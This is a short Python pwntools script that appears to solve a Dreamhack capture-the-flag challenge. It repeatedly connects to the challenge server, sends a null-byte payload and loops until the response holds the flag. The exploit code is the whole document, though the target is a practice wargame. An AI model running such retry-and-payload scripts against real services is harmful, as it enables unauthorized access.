from pwn import *

while True:
    p = remote('host3.dreamhack.games', 19084)

    payload = b'\x00'

    p.sendlineafter(b'?', payload)
    p.recvline()
    msg = p.recvline()
    if b'DH' in msg:
        print(msg)
        break;
    else:
        p.close()
